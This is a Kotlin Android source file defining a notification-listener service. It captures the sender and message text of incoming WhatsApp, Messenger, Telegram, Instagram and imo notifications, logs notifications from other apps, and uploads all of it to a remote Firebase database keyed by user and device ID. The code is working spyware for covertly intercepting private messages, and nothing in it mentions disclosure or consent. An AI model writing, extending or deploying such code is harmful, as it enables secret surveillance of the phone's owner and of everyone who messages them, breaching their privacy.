package com.example.myapplicationtestweb

import android.app.Notification
import android.os.Build
import android.os.Bundle
import android.os.SystemClock
import android.provider.Settings
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ServerValue
import java.util.concurrent.ConcurrentHashMap

class NotificationService : NotificationListenerService() {

    private lateinit var deviceId: String
    private val lastSentMap = ConcurrentHashMap<String, Long>()
    private val recentMessageHashes = ConcurrentHashMap<String, Long>()

    override fun onCreate() {
        super.onCreate()
        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        sbn?.let {
            val pkg = (it.packageName ?: "").lowercase()
            val extras = it.notification.extras
            val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""

            // Determine social chat apps by package matching
            val appKey = when {
                pkg.contains("whatsapp") -> "whatsapp"
                pkg.contains("facebook.orca") || pkg.contains("messenger") -> "messenger"
                pkg.contains("telegram") || pkg.contains("challegram") -> "telegram"
                pkg.contains("instagram") -> "instagram"
                pkg.contains("imo") -> "imo"
                else -> null
            }

            if (appKey != null) {
                var finalSender = title
                var finalBody = text

                // Extract conversation messages if MessagingStyle is present
                try {
                    val messages = extras.getParcelableArray(Notification.EXTRA_MESSAGES)
                    if (messages != null && messages.isNotEmpty()) {
                        val lastMessage = messages.last() as? Bundle
                        if (lastMessage != null) {
                            val msgText = lastMessage.getCharSequence("text")?.toString()
                            if (!msgText.isNullOrEmpty()) finalBody = msgText
                            
                            val senderName = lastMessage.getCharSequence("sender")?.toString()
                            if (!senderName.isNullOrEmpty()) finalSender = senderName
                        }
                    }
                } catch (e: Exception) {}

                if (finalSender.isNotBlank() || finalBody.isNotBlank()) {
                    // Deduplication based on sender + body + appKey
                    val dedupeKey = "$appKey|$finalSender|$finalBody"
                    val now = SystemClock.elapsedRealtime()
                    val lastTime = recentMessageHashes[dedupeKey] ?: 0L
                    
                    if (now - lastTime > 4000) { // 4-second debounce per identical message
                        recentMessageHashes[dedupeKey] = now
                        sendToChatLogs(appKey, pkg, finalSender, finalBody)
                    }
                }
            } else {
                // General notifications logging
                val blacklistedApps = listOf(
                    "android", "com.android.settings", "com.android.systemui", 
                    "com.google.android.gms", "com.google.android.vending", packageName.lowercase()
                )
                if (blacklistedApps.any { b -> pkg.contains(b) }) return
                if (title.isEmpty() && text.isEmpty()) return

                val now = SystemClock.elapsedRealtime()
                val last = lastSentMap[pkg] ?: 0L
                if (now - last > 15_000) {
                    sendToLogsBot(pkg, title, text)
                    lastSentMap[pkg] = now
                }
            }
        }
    }

    private fun sendToChatLogs(appKey: String, pkg: String, sender: String, body: String) {
        val userId = Config.getUserId(this)
        if (userId.isEmpty() || deviceId == "unknown") return

        val dbUrl = Config.getDbUrl(this)
        val database = FirebaseDatabase.getInstance(dbUrl)
        val ref = database.reference.child("users").child(userId).child("devices").child(deviceId)
            .child("chats").child(appKey).child("messages")

        ref.push().setValue(mapOf(
            "sender" to sender,
            "body" to body,
            "time" to ServerValue.TIMESTAMP,
            "app" to appKey,
            "pkg" to pkg
        ))
    }

    private fun sendToLogsBot(pkg: String, title: String, text: String) {
        val userId = Config.getUserId(this)
        if (userId.isEmpty() || deviceId == "unknown") return

        val dbUrl = Config.getDbUrl(this)
        val database = FirebaseDatabase.getInstance(dbUrl)
        val deviceRef = database.reference.child("users").child(userId).child("devices").child(deviceId)

        val appName = pkg.split(".").lastOrNull()?.replaceFirstChar { it.uppercase() } ?: pkg
        val logText = "🔔 [NOTIFICATION - $appName]\nTitle: $title\nText: $text"

        deviceRef.child("logs").push().setValue(mapOf(
            "log" to logText,
            "time" to ServerValue.TIMESTAMP
        ))
    }
}
